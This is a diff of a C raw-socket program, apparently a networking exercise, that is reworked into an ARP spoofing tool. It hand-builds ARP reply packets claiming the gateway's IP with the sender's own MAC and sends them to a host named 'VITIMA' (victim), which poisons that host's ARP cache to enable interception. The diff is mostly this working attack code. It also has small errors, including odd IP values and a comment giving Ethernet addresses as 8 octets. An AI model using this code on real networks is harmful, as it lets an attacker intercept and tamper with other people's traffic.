@@ -25,15 +25,15 @@
 #define MY_DEST_MAC5 0xff //0xcd
 
 //ROUTER <--> sendRawEth.c <--> DEST
-#define ROUTER_IP0 192
-#define ROUTER_IP1 162
-#define ROUTER_IP2 1
-#define ROUTER_IP3 1
+#define GATEWAY_IP0 192
+#define GATEWAY_IP1 162
+#define GATEWAY_IP2 1
+#define GATEWAY_IP3 1
 
 #define VITIMA_IP0 192
 #define VITIMA_IP1 192
 #define VITIMA_IP2 1
-#define VITIMA_IP3 105
+#define VITIMA_IP3 102
 
 #define ETHER_TYPE	0x0800
 
@@ -72,24 +72,52 @@ void fill_arp(struct arp_packet *pkt, const uint8_t *mac, const uint8_t *ip_dest
 	pkt->sender_hwaddr[4] = mac[4];
 	pkt->sender_hwaddr[5] = mac[5];
 
-	pkt->sender_ip[0] = ip_dest[0];
-	pkt->sender_ip[1] = ip_dest[1];
-	pkt->sender_ip[2] = ip_dest[2];
-	pkt->sender_ip[3] = ip_dest[3];
+	pkt->sender_ip[0] = GATEWAY_IP0; //ip_dest[0];
+	pkt->sender_ip[1] = GATEWAY_IP1; //ip_dest[1];
+	pkt->sender_ip[2] = GATEWAY_IP2;   //ip_dest[2];
+	pkt->sender_ip[3] = GATEWAY_IP3;   //ip_dest[3];
 
-	pkt->target_hwaddr[0] = 0xff; //MY_DEST_MAC0;
-	pkt->target_hwaddr[1] = 0xff; //MY_DEST_MAC1;
-	pkt->target_hwaddr[2] = 0xff; //MY_DEST_MAC2;
-	pkt->target_hwaddr[3] = 0xff; //MY_DEST_MAC3;
-	pkt->target_hwaddr[4] = 0xff; //MY_DEST_MAC4;
-	pkt->target_hwaddr[5] = 0xff; //MY_DEST_MAC5;
+	pkt->target_hwaddr[0] = MY_DEST_MAC0;
+	pkt->target_hwaddr[1] = MY_DEST_MAC1;
+	pkt->target_hwaddr[2] = MY_DEST_MAC2;
+	pkt->target_hwaddr[3] = MY_DEST_MAC3;
+	pkt->target_hwaddr[4] = MY_DEST_MAC4;
+	pkt->target_hwaddr[5] = MY_DEST_MAC5;
 
-	pkt->target_ip[0] = 0; //ip_dest[0];
-	pkt->target_ip[1] = 0; //ip_dest[1];
-	pkt->target_ip[2] = 0; //ip_dest[2];
-	pkt->target_ip[3] = 0; //ip_dest[3];
+	pkt->target_ip[0] = ip_dest[0];
+	pkt->target_ip[1] = ip_dest[1];
+	pkt->target_ip[2] = ip_dest[2];
+	pkt->target_ip[3] = ip_dest[3];
 
   return;
+}
+
+void print_arp(struct arp_packet *pkt) {
+  printf("ARP - hw_type       %x\n", pkt->hw_type);
+  printf("ARP - prot_type     %x\n", pkt->prot_type);
+  printf("ARP - hlen          %x\n", pkt->hlen);
+  printf("ARP - dlen          %x\n", pkt->dlen);
+  printf("ARP - operation     %x\n", pkt->operation);
+  printf("ARP - sender_hwaddr %x:%x:%x:%x:%x:%x\n", pkt->sender_hwaddr[0],
+                                                    pkt->sender_hwaddr[1],
+                                                    pkt->sender_hwaddr[2],
+                                                    pkt->sender_hwaddr[3],
+                                                    pkt->sender_hwaddr[4],
+                                                    pkt->sender_hwaddr[5]);
+  printf("ARP - sender_ip     %d.%d.%d.%d\n", pkt->sender_ip[0],
+                                              pkt->sender_ip[1],
+                                              pkt->sender_ip[2],
+                                              pkt->sender_ip[3]);
+  printf("ARP - target_hwaddr %x:%x:%x:%x:%x:%x\n", pkt->target_hwaddr[0],
+                                                    pkt->target_hwaddr[1],
+                                                    pkt->target_hwaddr[2],
+                                                    pkt->target_hwaddr[3],
+                                                    pkt->target_hwaddr[4],
+                                                    pkt->target_hwaddr[5]);
+  printf("ARP - target_ip     %d.%d.%d.%d\n", pkt->target_ip[0],
+                                              pkt->target_ip[1],
+                                              pkt->target_ip[2],
+                                              pkt->target_ip[3]);
 }
 
 int main(int argc, char *argv[])
@@ -101,10 +129,11 @@ int main(int argc, char *argv[])
 	uint8_t sendbuf[BUF_SIZ];
 	struct ether_header *eh = (struct ether_header *) sendbuf;
 	struct iphdr *iph = (struct iphdr *) (sendbuf + sizeof(struct ether_header));
-  struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header) + sizeof(struct iphdr));
+  //struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header) + sizeof(struct iphdr));
+  struct arp_packet *arp_payload = (struct arp_packet *) (sendbuf + sizeof(struct ether_header));
 	struct sockaddr_ll socket_address;
 	char ifName[IFNAMSIZ];
-  //uint8_t ip_dest[4] = {ROUTER_IP0,ROUTER_IP1,ROUTER_IP2,ROUTER_IP3};
+  //uint8_t ip_dest[4] = {GATEWAY_IP0,GATEWAY_IP1,GATEWAY_IP2,GATEWAY_IP3};
   uint8_t ip_dest[4] = {VITIMA_IP0,VITIMA_IP1,VITIMA_IP2,VITIMA_IP3};
 
 	/* Get interface name */
@@ -148,7 +177,37 @@ int main(int argc, char *argv[])
   eh->ether_type = htons(ETH_P_ARP);
 	tx_len += sizeof(struct ether_header);
 
-  fill_arp(arp_payload,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),ip_dest,2);
+  //fill_arp(arp_payload,((uint8_t *)&if_mac.ifr_hwaddr.sa_data),ip_dest,2);
+  arp_payload->hw_type = htons(ARPHRD_ETHER);    //hardware type = Ethernet
+	arp_payload->prot_type = htons(ETH_P_IP);      //protocol type = IPv4
+	arp_payload->hlen = ETH_ALEN;                  //Ethernet addresses are 8 octets
+	arp_payload->dlen = 4;                         //IPv4 addresses are 4 octets
+	arp_payload->operation = htons(2);             //1 for REQUEST, 2 for REPLY
+
+	arp_payload->sender_hwaddr[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
+	arp_payload->sender_hwaddr[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
+	arp_payload->sender_hwaddr[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
+	arp_payload->sender_hwaddr[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
+	arp_payload->sender_hwaddr[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
+	arp_payload->sender_hwaddr[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
+
+	arp_payload->sender_ip[0] = GATEWAY_IP0;
+	arp_payload->sender_ip[1] = GATEWAY_IP1;
+	arp_payload->sender_ip[2] = GATEWAY_IP2;
+	arp_payload->sender_ip[3] = GATEWAY_IP3;
+
+	arp_payload->target_hwaddr[0] = MY_DEST_MAC0;
+	arp_payload->target_hwaddr[1] = MY_DEST_MAC1;
+	arp_payload->target_hwaddr[2] = MY_DEST_MAC2;
+	arp_payload->target_hwaddr[3] = MY_DEST_MAC3;
+	arp_payload->target_hwaddr[4] = MY_DEST_MAC4;
+	arp_payload->target_hwaddr[5] = MY_DEST_MAC5;
+
+	arp_payload->target_ip[0] = VITIMA_IP0;
+	arp_payload->target_ip[1] = VITIMA_IP1;
+	arp_payload->target_ip[2] = VITIMA_IP2;
+	arp_payload->target_ip[3] = VITIMA_IP3;
+
   tx_len += sizeof(struct arp_packet);
 
   /* Index of the network device */
@@ -163,32 +222,7 @@ int main(int argc, char *argv[])
 	socket_address.sll_addr[4] = MY_DEST_MAC4;
 	socket_address.sll_addr[5] = MY_DEST_MAC5;
 
-  printf("ARP - hw_type       %x\n", arp_payload->hw_type);
-  printf("ARP - prot_type     %x\n", arp_payload->prot_type);
-  printf("ARP - hlen          %x\n", arp_payload->hlen);
-  printf("ARP - dlen          %x\n", arp_payload->dlen);
-  printf("ARP - operation     %x\n", arp_payload->operation);
-  printf("ARP - sender_hwaddr %x:%x:%x:%x:%x:%x\n", arp_payload->sender_hwaddr[0],
-                                                    arp_payload->sender_hwaddr[1],
-                                                    arp_payload->sender_hwaddr[2],
-                                                    arp_payload->sender_hwaddr[3],
-                                                    arp_payload->sender_hwaddr[4],
-                                                    arp_payload->sender_hwaddr[5]);
-  printf("ARP - sender_ip     %d.%d.%d.%d\n", arp_payload->sender_ip[0],
-                                              arp_payload->sender_ip[1],
-                                              arp_payload->sender_ip[2],
-                                              arp_payload->sender_ip[3]);
-  printf("ARP - target_hwaddr %x:%x:%x:%x:%x:%x\n", arp_payload->target_hwaddr[0],
-                                                    arp_payload->target_hwaddr[1],
-                                                    arp_payload->target_hwaddr[2],
-                                                    arp_payload->target_hwaddr[3],
-                                                    arp_payload->target_hwaddr[4],
-                                                    arp_payload->target_hwaddr[5]);
-  printf("ARP - target_ip     %d.%d.%d.%d\n", arp_payload->target_ip[0],
-                                              arp_payload->target_ip[1],
-                                              arp_payload->target_ip[2],
-                                              arp_payload->target_ip[3]);
-
+  print_arp(arp_payload);
 	/* Send packet */
   if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
 	    printf("Send failed\n");
